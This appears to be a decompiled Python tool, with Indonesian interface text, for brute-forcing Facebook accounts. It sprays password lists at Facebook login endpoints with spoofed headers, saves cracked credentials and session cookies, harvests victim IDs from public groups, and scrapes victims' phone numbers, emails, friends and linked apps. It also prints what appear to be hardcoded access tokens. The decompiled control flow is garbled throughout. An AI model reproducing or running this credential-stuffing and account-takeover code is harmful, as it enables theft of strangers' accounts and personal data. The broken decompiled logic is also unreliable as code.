                        time.sleep(31)
                        continue
                        loop += 1
                        return None








    
    def crack2(idf, pwv):
        global cp, ok, loop
        bi = random.choice([
            u,
            k,
            kk,
            b,
            h,
            hh])
        pers = loop * 100 / len(id2)
        fff = '%'
        print('\r%s [Barus] %s/%s ~_~ [OK*%s | CP*%s ~_~ %s%s%s' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x), ' ', **('end',))
        sys.stdout.flush()
        ua = random.choice(ugen).replace('\n', '')
        ses = requests.Session()
        for pw in pwv:
            
            try:
                head = {
                    'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                    'x-fb-sim-hni': str(random.randint(20000, 40000)),
                    'x-fb-net-hni': str(random.randint(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': ua,
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger' }
                resp = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(idf) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', head, **('headers',))
                if 'www.facebook.com' in resp.json()['error_msg']:
                    if 'ya' in oprek:
                        akun.append(idf + '|' + pw)
                        ceker(idf, pw)
                    else:
                        print('\r%s++++ %s|%s ----> CP       ' % (b, idf, pw))
                open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                akun.append(idf + '|' + pw)
                cp += 1
            finally:
                pass
            if 'session_key' in resp.text and 'EAAB' in resp.text:
                print('\r%s++++ %s|%s ----> OK       ' % (h, idf, pw))
                open('OK/' + okc, 'a').write(idf + '|' + pw + '\n')
                ok += 1
            continue
            if requests.exceptions.ConnectionError:
                time.sleep(31)
                continue
                loop += 1
                return None


    
    def crack3(idf, pwv):
        global cp, ok, loop
        bi = random.choice([
            u,
            k,
            kk,
            b,
            h,
            hh])
        pers = loop * 100 / len(id2)
        fff = '%'
        print('\r%s [Barus] %s/%s ~_~ [OK:%s | CP:%s] ~_~ %s%s%s' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x), ' ', **('end',))
        sys.stdout.flush()
        ua = random.choice(ugen)
        ua2 = random.choice(ugen2)
        ses = requests.Session()
        for pw in pwv:
            
            try:
                tix = time.time()
                ses.headers.update({
                    'Host': 'mbasic.facebook.com',
                    'upgrade-insecure-requests': '1',
                    'user-agent': ua2,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'dnt': '1',
                    'x-requested-with': 'mark.via.gp',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-user': 'empty',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://mbasic.facebook.com/',
                    'accept-encoding': 'gzip, deflate br',
                    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' })
                p = ses.get('https://mbasic.facebook.com/login/?email=' + idf).text
                dataa = {
                    'lsd': re.search('name="lsd" value="(.*?)"', str(p)).group(1),
                    'jazoest': re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
                    'm_ts': re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
                    'li': re.search('name="li" value="(.*?)"', str(p)).group(1),
                    'email': idf,
                    'pass': pw }
                ses.headers.update({
                    'Host': 'mbasic.facebook.com',
                    'cache-control': 'max-age=0',
                    'upgrade-insecure-requests': '1',
                    'origin': 'https://mbasic.facebook.com',
                    'content-type': 'application/x-www-form-urlencoded',
                    'user-agent': ua,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-user': 'empty',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://mbasic.facebook.com/login/?email=' + idf,
                    'accept-encoding': 'gzip, deflate br',
                    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' })
                po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated', dataa, False, **('data', 'allow_redirects'))
                if 'checkpoint' in po.cookies.get_dict().keys():
                    if 'ya' in oprek:
                        akun.append(idf + '|' + pw)
                        ceker(idf, pw)
                    else:
                        print('\n')
                        statuscp = f''' ➾ ID : {idf}➾ PASSWORD : {pw}'''
                        statuscp1 = nel(statuscp, 'yellow', **('style',))
                        cetak(nel(statuscp1, 'YAH AKUN CP', **('title',)))
                        open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                        akun.append(idf + '|' + pw)
                        cp += 1
                elif 'c_user' in ses.cookies.get_dict().keys():
                    if 'no' in taplikasi:
                        ok += 1
                        coki = po.cookies.get_dict()
                        kuki = ';'.join((lambda .0: [ '%s=%s' % (key, value) for key, value in .0 ])(ses.cookies.get_dict().items()))
                        open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                        print('\n')
                        statusok = f'''➾ ID       : {idf}\n➾ PASSWORD : {pw}\n➾ COOKIES  : {kuki}'''
                        statusok1 = nel(statusok, 'cyan', **('style',))
                        cetak(nel(statusok1, 'AKUN OK OM', **('title',)))
                elif 'ya' in taplikasi:
                    ok += 1
                    coki = po.cookies.get_dict()
                    kuki = ';'.join((lambda .0: [ '%s=%s' % (key, value) for key, value in .0 ])(ses.cookies.get_dict().items()))
                open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                user = idf
                infoakun = ''
                session = requests.Session()
                get_id = session.get('https://m.facebook.com/profile.php', coki, **('cookies',)).text
                nama = re.findall('\\<title\\>(.*?)<\\/title\\>', str(get_id))[0]
                response = session.get('https://m.facebook.com/profile.php?v=info', coki, **('cookies',)).text
                response2 = session.get('https://m.facebook.com/profile.php?v=friends', coki, **('cookies',)).text
                response3 = session.get(f'''https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_''', coki, **('cookies',)).text
                response4 = session.get(f'''https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr''', coki, **('cookies',)).text
                
                try:
                    nomer = re.findall('\\<a\\ href\\="tel\\:\\+.*?">\\<span\\ dir\\="ltr">(.*?)<\\/span><\\/a>', str(response))[0]
                finally:
                    pass
                nomer = ''
                
                try:
                    email = re.findall('\\<a href\\="https\\:\\/\\/lm\\.facebook\\.com\\/l\\.php\\?u\\=mail.*?" target\\=".*?"\\>(.*?)<\\/a\\>', str(response))[0].replace('&#064;', '@')
                finally:
                    pass
                email = ''
                
                try:
                    ttl = re.findall('\\<\\/td\\>\\<td\\ valign\\="top" class\\=".*?"\\>\\<div\\ class\\=".*?"\\>(\\d+\\s+\\w+\\s+\\d+)<\\/div\\>\\<\\/td\\>\\<\\/tr\\>', str(response))[0]
                finally:
                    pass
                ttl = ''
                
                try:
                    teman = re.findall('\\<h3\\ class\\=".*?"\\>Teman\\ \\((.*?)\\)<\\/h3\\>', str(response2))[0]
                finally:
                    pass
                teman = ''
                
                try:
                    pengikut = re.findall('\\<span\\ class\\=".*?"\\>(.*?)\\<\\/span\\>', str(response4))[1]
                finally:
                    pass
                pengikut = ''
                
                try:
                    tahun = ''
                    cek_thn = re.findall('\\<div\\ class\\=".*?" id\\="year_(.*?)">', str(response3))
                finally:
                    pass
                (hit1, hit2) = (0, 0)
                cek = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=active', coki, **('cookies',)).text
                cek2 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=inactive', coki, **('cookies',)).text
                if 'Diakses menggunakan Facebook' in re.findall('\\<title\\>(.*?)<\\/title\\>', str(cek)):
                    infoakun += 'Aplikasi Yang Terkait*\n'
                    if 'Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau.' in cek:
                        infoakun += 'Tidak Ada Aplikasi Aktif Yang Terkait *\n'
                    else:
                        infoakun += '\tAplikasi Aktif : \n'
                        apkAktif = re.findall('\\/><div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>', str(cek))
                        ditambahkan = re.findall('\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>', str(cek))
                        if 'Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau' in cek2:
                            infoakun += '\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n'
                        else:
                            (hit1, hit2) = (0, 0)
                            infoakun += '\tAplikasi Kedaluwarsa :\n'
                            apkKadaluarsa = re.findall('\\/><div\\ class\\=".*?"\\>\\<span\\ class\\=".*?"\\>(.*?)<\\/span\\>', str(cek2))
                            kadaluarsa = re.findall('\\<div\\>\\<\\/div\\>\\<div\\ class\\=".*?"\\>(.*?)<\\/div\\>', str(cek2))
                else:
                    print('\n')
                    statusok = f'''➾ ID       : {idf}\n➾ PASSWORD : {pw}\n➾ COOKIES  : {kuki}\n\x1b[1;33m➾ {infoakun}'''
                    statusok1 = nel(statusok, 'cyan', **('style',))
                    cetak(nel(statusok1, 'AKUN OK OM', **('title',)))
                finally:
                    pass
                continue
                continue
                if requests.exceptions.ConnectionError:
                    time.sleep(31)
                    continue
                    loop += 1
                    return None








    
    def ceker(idf, pw):
        global cp
        ua = 'Mozilla/5.0 (BlackBerry; U; BlackBerry 9300; en-GB) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.600 Mobile Safari/534.8+'
        head = {
            'Host': 'mbasic.facebook.com',
            'cache-control': 'max-age=0',
            'upgrade-insecure-requests': '1',
            'origin': 'https://mbasic.facebook.com',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': ua,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' }
        ses = requests.Session()
        
        try:
            hi = ses.get('https://mbasic.facebook.com')
            ho = parser(ses.post('https://mbasic.facebook.com/login.php', {
                'email': idf,
                'pass': pw,
                'login': 'submit' }, head, True, **('data', 'headers', 'allow_redirects')).text, 'html.parser')
            jo = ho.find('form')
            data = { }
            lion = [
                'nh',
                'jazoest',
                'fb_dtsg',
                'submit[Continue]',
                'checkpoint_data']
            kent = parser(ses.post('https://mbasic.facebook.com' + str(jo['action']), data, head, **('data', 'headers')).text, 'html.parser')
            print('\r%s++++ %s|%s ----> CP       %s' % (b, idf, pw, x))
            open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
            cp += 1
            opsi = kent.find_all('option')
            if len(opsi) == 0:
                print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)' % (hh, x))
        finally:
            return None
            return None
            if Exception:
                [ '\r%s---> %s%s' % (kk, opsii.text, x) for opsii in opsi ]
                c = [ '\r%s---> %s%s' % (kk, opsii.text, x) for opsii in opsi ]
                [ '\r%s---> %s%s' % (kk, opsii.text, x) for opsii in opsi ]
                
                try:
                    print('\r%s++++ %s|%s ----> CP       %s' % (b, idf, pw, x))
                    print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s' % (u, x))
                    open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                    cp += 1
                finally:
                    c = None
                    del c
                    return None
                    c = None
                    del c



    
    def cek_opsi():
        c = len(akun)
        hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu' % c
        cetak(nel(hu, 'CEK OPSI', **('title',)))
        input(x + '[' + h + '•' + x + '] Mulai')
        cek = '# PROSES CEK OPSI DIMULAI'
        sol().print(mark(cek, 'green', **('style',)))
        love = 0
        for kes in akun:
            
            try:
                
                try:
                    id = kes.split('|')[0]
                    pw = kes.split('|')[1]
                finally:
                    pass
                if IndexError:
                    time.sleep(2)
                    print('\r%s++++ %s ----> Error      %s' % (b, kes, x))
                    print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s' % (u, x))
                continue
                bi = random.choice([
                    u,
                    k,
                    kk,
                    b,
                    h,
                    hh])
                sys.stdout.flush()
                ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
                ses = requests.Session()
                header = {
                    'Host': 'mbasic.facebook.com',
                    'cache-control': 'max-age=0',
                    'upgrade-insecure-requests': '1',
                    'origin': 'https://mbasic.facebook.com',
                    'content-type': 'application/x-www-form-urlencoded',
                    'user-agent': ua,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'x-requested-with': 'mark.via.gp',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-user': '?1',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',
                    'accept-encoding': 'gzip, deflate',
                    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' }
                hi = ses.get('https://mbasic.facebook.com')
                ho = parser(ses.post('https://mbasic.facebook.com/login.php', {
                    'email': id,
                    'pass': pw,
                    'login': 'submit' }, header, True, **('data', 'headers', 'allow_redirects')).text, 'html.parser')
                if 'checkpoint' in ses.cookies.get_dict().keys():
                    
                    try:
                        jo = ho.find('form')
                        data = { }
                        lion = [
                            'nh',
                            'jazoest',
                            'fb_dtsg',
                            'submit[Continue]',
                            'checkpoint_data']
                        kent = parser(ses.post('https://mbasic.facebook.com' + str(jo['action']), data, header, **('data', 'headers')).text, 'html.parser')
                        print('\r%s++++ %s|%s ----> CP       %s' % (b, id, pw, x))
                        opsi = kent.find_all('option')
                        if len(opsi) == 0:
                            print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)' % (hh, x))
                    finally:
                        pass
                    print('\r%s++++ %s|%s ----> CP       %s' % (b, id, pw, x))
                    print('\r%s---> Tidak Dapat Mengecek Opsi%s' % (u, x))
                    if 'c_user' in ses.cookies.get_dict().keys():
                        print('\r%s++++ %s|%s ----> OK       %s' % (h, id, pw, x))
                    


                print('\r%s++++ %s|%s ----> SALAH       %s' % (x, id, pw, x))
                love += 1
            finally:
                continue
                if requests.exceptions.ConnectionError:
                    print('')
                    li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
                    sol().print(mark(li, 'red', **('style',)))
                    exit()
                    continue
                    dah = '# DONE'
                    sol().print(mark(dah, 'green', **('style',)))
                    exit()
                    return None


    
    def jalan(z):
        pass

    
    def mlaku(z):
        pass

    
    def kontol():
        os.system('clear')
        print('    \n\x1b[95m██████╗░░█████╗░██████╗░██╗░░░██╗░██████╗\n\x1b[95m██╔══██╗██╔══██╗██╔══██╗██║░░░██║██╔════╝\n\x1b[95m██████╦╝███████║██████╔╝██║░░░██║╚█████╗░\n\x1b[1;32m██╔══██╗██╔══██║██╔══██╗██║░░░██║░╚═══██╗\n\x1b[1;92m██████╦╝██║░░██║██║░░██║╚██████╔╝██████╔╝\n\x1b[0;34m╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═════╝░\n\x1b[0;34m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█\n\x1b[0;34m█  \x1b[mGithub: https://github.com/jepribarus\n\x1b[0;34m█  \x1b[mFacebook: Jepri Barus\n\x1b[0;34m█  \x1b[mWhatsApp: 085767354326\n\x1b[0;34m█  \x1b[mTools : \x1b[1;96mPremium\n\x1b[0;34m█  \x1b[mDi Update : \x1b[1;96mRabu 20-04-2022\n\x1b[0;34m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█')

    
    def licensi():
        
        try:
            os.system('clear')
            kontol()
            print('\n')
            print('\x1b[m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●')
            print('•\x1b[1;33mJika Anda Sudah Memiliki Licensi')
            print('•\x1b[1;33mHarap Simpan Lisensi Anda Di Notpad')
            print('•\x1b[1;33mTools Meminta Licensi Setiap Login')
            print('\x1b[m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●')
            print('\n')
            print('\x1b[m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●')
            jalan('%s\x1b[1;95m╚══[%s01%s] %s\x1b[1;32mBuy Licensi/Tanya Licensi Trial' % (M, P, M, P))
            jalan('%s\x1b[1;95m╚══[%s02%s] %s\x1b[1;32mMasukan Licensi' % (M, P, M, P))
            jalan('%s\x1b[1;33m╚══[%s03%s] %s\x1b[1;33mExit' % (M, P, M, P))
            print('%s\x1b[m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬● ' % h)
            OOO00O0OOO00OO00O = input(f'''{H}[{P}?{H}]{P}\x1b[1;96mInput Number :{K} ''')
            if OOO00O0OOO00OO00O in ('1', '01'):
                print(f'''{H}[{P}!{H}]{P} Send Message..''')
                time.sleep(3)
                os.system('xdg-open https://wa.me/6285767354326?text=Bang+Jep+buy+Lisensi+25k+sebulan')
                exit()
        finally:
            return None
            if OOO00O0OOO00OO00O in ('2', '02'):
                O000O000OOO000OOO = input(f'''{H}[{P}?{H}]{P}\x1b[1;96mMasukan Lisensi :{K} ''')
                if len(O000O000OOO000OOO) == 0:
                    exit(f'''{P}[{M}!{P}]{M} Jangan Kosong''')
                return None
            with None.Session() as O0O0OO0O0O00OOOO0:
                OOO00OO00O0O0OOOO = O0O0OO0O0O00OOOO0.get(f'''https://app.cryptolens.io/api/key/activate?token=WyIxNjcwNDIyNiIsIlRPU0dITWFyT25aYXkwUzYwRVhXN0MwZlB4ZnRXeFZuN1R6TnMrV2UiXQ==&ProductId=14793&Key={O000O000OOO000OOO}&Sign=True''').json()['licenseKey']
                open('apikey.txt', 'w').write(O000O000OOO000OOO)
                print(f'''{H}[{P}*{H}]{P}\x1b[1;97mTanggal Expired :{K} {OOO00OO00O0O0OOOO['expires'].split('T')[0]}''')
                time.sleep(5)
                pilihan()
                None(None, None, None)
            if not None:
                pass
            return None
            return None
            if OOO00O0OOO00OO00O in ('3', '03'):
                exit()
            return None
            exit(f'''{P}[{M}!{P}]{M} Yang Anda Masukan Salah''')
            return None
            if KeyError:
                print(f'''{P}[{M}!{P}]{M}\x1b[1;33mAPI KEY TIDAK TERDAFTAR''')
                print(f'''{H}[{P}!{H}]{P} Sabar Om Sedang Ke WhatsApp''')
                time.sleep(3)
                os.system('xdg-open https://wa.me/6285767354326?text=Bang+Jep+buy+Lisensi+25k+sebulan')
                exit()
                return None
            if Exception:
                O0OO00OOO000OOO00 = None
                
                try:
                    exit(f'''{P}[{M}!{P}]{M} {O0OO00OOO000OOO00}''')
                finally:
                    O0OO00OOO000OOO00 = None
                    del O0OO00OOO000OOO00
                    return None
                    O0OO00OOO000OOO00 = None
                    del O0OO00OOO000OOO00



    balmond = O + '[' + J + '•' + O + ']'
    
    def lah():
        print('\r' + balmond + m + ' Total ID : ' + str(len(id)) + '                     ')
        input(balmond + m + ' Mode Pesawat 5 Detik Dan Tekan Enter Untuk Mulai Crack ')
        setting()

    
    def grup():
        win = '# PASTIKAN ID GROUP PUBLIK'
        win2 = mark(win, 'cyan', **('style',))
        sol().print(win2)
        id = input('' + balmond + h + ' \x1b[1;96mId Atau User Name Grup : ')
        ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
        miskinlu = {
            'user-agent': ua }
        url = 'https://mbasic.facebook.com/groups/' + id
        ses = requests.Session()
        
        try:
            gn = parser(ses.get(url, miskinlu, **('headers',)).text, 'html.parser')
        finally:
            pass
        if requests.exceptions.ConnectionError:
            print(balmond + m + ' \x1b[1;33mKoneksi Internet Terputus..')
            time.sleep(0.5)
            exit()
        else:
            berr = gn.find('title')
            berr2 = berr.text.replace(' | Facebook', '').replace(' Grup Publik', '')
            if berr2 == 'Masuk Facebook':
                print(balmond + m + ' Limit, Silahkan Mode Pesawat Dan Coba Lagi..')
                time.sleep(0.5)
                exit()
            elif berr2 == 'Kesalahan':
                jalan(balmond + m + ' \x1b[1;33mGrup Tidak Ditemukan..')
                time.sleep(0.5)
                exit()
            else:
                print('' + balmond + p + ' \x1b[1;32mNama Grup : ' + berr2)
                ggs = gn.find_all('table')
                ang = []
                for ff in ggs:
                    anggo = ff.text
                    bro = anggo.replace('Anggota', '')
                    
                    try:
                        mex = int(bro)
                        jumlah = ang.append(mex)
                    finally:
                        continue
                        continue
                        if len(ang) == 0:
                            print(balmond + h + ' Anggota : -')
                        
                        print(balmond + h + ' Anggota : ' + str(ang[0]))
                        grup1(url)
                        return None



    
    def grup1(urls):
        use = []
        ses = requests.Session()
        print('' + balmond + m + ' \x1b[1;32mJika Stack, Mode Pesawat 5 Detik')
        print(balmond + m + ' \x1b[1;32mSedang Mengumpulkan ID')
        print(balmond + m + ' \x1b[1;32mTekan CTRL + C Untuk Stop')
        
        try:
            ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
            miskinlu = {
                'user-agent': ua }
            
            try:
                url = use[0]
            finally:
                pass
            url = urls
            set = parser(ses.get(url, miskinlu, **('headers',)).text, 'html.parser')
            bf2 = set.find_all('a')
            tes = set.find_all('table')
            id.append(idku)
            print('\r' + balmond + h + ' { ' + k + 'Proses Mengambil ID ' + str(len(id)) + h + ' }', '', **('end',))
            sys.stdout.flush()
            continue
            if '>' in spl:
                idsiapa = re.findall('content_owner_id_new.\\w+', str(cari))
                idyou = idsiapa[0].replace('content_owner_id_new.', '')
                namayou = liatnih.split(' > ')[0]
                idku = idyou + '|' + namayou
                if idku in id:
                    continue
                    id.append(idku)
                    print('\r' + balmond + h + ' { ' + O + 'Mengumpulkan ID ' + str(len(id)) + h + ' }', '', **('end',))
                    sys.stdout.flush()
                    continue
                    continue
                    
                    try:
                        link_ = bcj2
                        use.insert(0, 'https://mbasic.facebook.com' + link_)
                    finally:
                        pass
                    girang = set.find('title')
                    girang2 = girang.text.replace(' | Facebook', '').replace(' Grup Publik', '')
                    if girang2 == 'Masuk Facebook':
                        lah()
                    if requests.exceptions.ConnectionError:
                        
                        try:
                            time.sleep(31)
                        finally:
                            pass
                        if KeyboardInterrupt:
                            lah()
                        

                        if KeyboardInterrupt:
                            lah()
                        




    
    def pilihan():
        clear()
        banner()
        print('%s \x1b[1;33m•Script Di Update Setiap Hari Jam 18:00 ' % h)
        print('%s \x1b[1;33m•Ketik ( git pull ) untuk meng-update script ' % h)
        print('%s \x1b[1;33m•Token Gratis Error? Update Script ' % h)
        print('%s \x1b[1;33m•Update Setiap jam 18:00 ' % h)
        print('%s \x1b[1;33m•untuk mendapatkan token gratis Terbaru Fresh ' % h)
        print('%s \x1b[m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬MENU▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬● ' % h)
        print('%s \x1b[1;32m[01] CRACK AKUN FACEBOOK \x1b[1;96mPRO' % h)
        print('%s \x1b[1;32m[02] TOKEN EAAB GRATIS ' % h)
        print('%s \x1b[1;32m[03] BOT SHARE FACEBOOK ' % h)
        print('%s \x1b[1;32m[04] ENCRIPT OBFUCATED PYTHON3 ' % h)
        print('%s \x1b[1;32m[05] ENCRIPT OBFEXEC PYTHON3 ' % h)
        print('%s \x1b[1;32m[06] ENCRIPT MARSHAL PYTHON3 ' % h)
        print('%s \x1b[1;32m[07] INSTAGRAM CRACK [PRO] ' % h)
        print('%s \x1b[m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬● ' % h)
        jh = input(x + '\x1b[1;96m•Input Number> ')
        if jh in ('1', '01'):
            login()
            return None
        if None in ('2', '02'):
            token_gratis()
            return None
        if None in ('3', '03'):
            os.system('python data/botku.py')
            return None
        if None in ('4', '04'):
            os.system('python data/obfucated.py')
            return None
        if None in ('5', '05'):
            os.system('python data/obfexec.py')
            return None
        if None in ('6', '06'):
            os.system('python data/marshal.py')
            return None
        if None in ('7', '07'):
            ig_pro()
            return None

    
    def token_gratis():
        clear()
        banner()
        print('%s \x1b[1;33m\nEAABsbCS1iHgBAESE7IjzaQ1AVSCPZB7LDGjqRUphRrRCNwPcosaEdjQzyYbJBqTpRXzfbsjbCq5PakqpErEMrVtIsifOQWk7Fh3404NaICZBP0jQSCKzNOZA9zlfUm4ea2L9nJbXE43oH6IXUz1y0Ejd32EWh6ZBNqnKVA5iUZBPFSDSdCHsZA ' % h)
        print('%s \x1b[1;33m\n\nEAABsbCS1iHgBAEddKC6wd7Cshe0Ipumbx4ZBZC5oEsRSIFacFhAO9F1AGCcwbhPbjDH1ZAHHj5HZBEc9dHubyZCzWsKdipVkOLJpvieDXJVVjULh60dCqFI7UXeYcd3E3yEGA27lD671LOZCXI1oZANOJb2bnauYzLwKi72esoskJ393RD724U1 ' % h)
        print('%s \x1b[1;33m\n\nEAABsbCS1iHgBALpoQwZAmZA1fedAZB5KaG3J49jGv8uuvnZAY6tzrv3gao6ZAZBvLC2nb3PFeOWrgMxgGkfbjbmz2sB3SeHibbZAR8BTBTaWhEa9ySGIMKR2ZBXMGnURQryKfhpMXSiaUvWZB5uORVlWVCmjI7vFecZCZA3KddBwHXpbgZDZD ' % h)
        print('%s \x1b[1;33m\n\nEAABsbCS1iHgBAGW4wVHlIelpC3N1Ac2RLZCSO3NH625arBWFuZB0kIpTdd8kXt3UFA52WtKtsZBf8kZAVIHgkPyEP5GEUK9J6vIQdjoOJLmC27GwFkELz37Cgx0YGW32ijHZCDZA2Qc6z4V2PkU8NhUSHMG3Gjnjt726Wf6furliRNIeaifWwF ' % h)
        print('%s \x1b[1;33m\n\nEAABsbCS1iHgBAMi2rBn1S0Iy8Id11umOCGQAyhZBZCzv6byJDgjZC33PXZAqKUZALMjbPzfqZCnZAnXVOj4FbAegUQte7ZBSCbNkrdvdn78CSEfHoZAsPibgqKfUZCudsendLGwmZA1FH71pko6WOmb5OtTnMe6bhERo5fZCGh2NIoSJlSEEZAM04ymNM ' % h)
        print('%s \x1b[1;33m\n\nEAABsbCS1iHgBAI8z8cAusiZCeV0iEZAFZCHVXFrCZCZBkzZAsZAgxbA5Bh9ie2ZAhv2es4u6NonZCeX7sFtfj8WmmrGjcYksZCGuiDhZBkM4QRHVwsrtvfBXqxX6X53R49n1rOY7ZAZC4Se0ZCMoNQNCfo6TNoe381fNSmuTIfJlKvK2TawZAedJj6lIIGo ' % h)
        exit()

    
    def ig_pro():
        clear()
        banner()
        jalan('%s╚══[%s!%s] %sSC SEDANG TAHAP PENGEMBANGAN' % (M, P, M, P))
        exit()

    if __name__ == '__main__':
        os.system('git pull')
        
        try:
            os.mkdir('CP')
        finally:
            pass
        
        try:
            os.mkdir('OK')
        finally:
            pass
        licensi()
        return None
        return None





